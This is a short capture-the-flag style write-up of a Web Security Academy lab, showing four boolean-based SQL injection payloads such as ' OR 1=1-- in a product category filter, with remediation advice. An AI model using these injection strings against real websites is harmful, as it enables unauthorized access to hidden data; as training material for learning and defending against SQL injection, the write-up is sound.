**Lab Title:** SQL injection vulnerability in WHERE clause allowing retrievel of hidden data
**Category:**: SQL Injection
**Platform:** Web Security Academy
**Author:**: Gurmat Singh Sour
**Date:**: July 30, 2025

---

## 1. Summary
This report covers how i was able to exploit an SQL injection vulnerability in the product category filter.

---

## 2. Reconnaissance

**Target URL:**
`https://0a0600d9042399a482979cd4001300d3.web-security-academy.net/`

**Tools Used:**
- Burp Suite Community Edition

**Pages observed:**
- `/`
- `/filter?category=Tech+gifts` - Displays products filtered by category 

The second endpoint seemed to be accessing valid categories from the dataset and to confirm that, i tried using SQL basic queries to see if there's a SQL injection vulnerability.

---

## 3. Exploitation

### Payload used:

``` 
/filter?category=Tech gifts' OR 1=1

```
![Output](/Screenshots/SQL_injectionLab1/1.png)

```
/filter?category=Gifts' AND 1=1
```
![alt text](/Screenshots/SQL_injectionLab1/2.png)

```
/filter?category=Gifts' And 1=2
```
![alt text](/Screenshots/SQL_injectionLab1/3.png)

```
/filter?category=' OR 1=1--
```
![alt text](/Screenshots/SQL_injectionLab1/4.png)

---



## 4. Vulnerability

This immediately tells you that there's a SQL injection present here because when we executed 1=1 which basically means True, the database was able to retrieve the category and the condition true worked. But when i executed 1=2, which asks model to ask,

    Is there a category named "Gifts"? 
    Model: yes
    AND is 1=2 ?
    Model: No
    so the condition became false and database returned nothing.

Finally, the last endpoint I used to find every category that was hidden in the frontend.

---

## 4. Conclusion

The category parameter in the /filter endpoint is vulnerable to Boolean-based SQL injection. By manipulating the input using logical conditions like OR 1=1 and AND 1=2, I was able to bypass category-based filtering and retrieve hidden data from the database.

This confirms that user input is being directly incorporated into the SQL query without proper sanitization or parameterization, making the application susceptible to further exploitation in a real-world scenario

---

## 5. Recommendation

To prevent SQL injection vulnerabilities:

Use parameterized queries (prepared statements) for all database interactions to ensure user input is treated as data, not code.
Implement strict server-side input validation to only allow expected values for parameters like category.
Avoid dynamic SQL wherever possible.
Employ web application firewalls (WAFs) and continuously monitor for suspicious query patterns.
Regularly perform security testing and code reviews to identify and fix injection risks early.
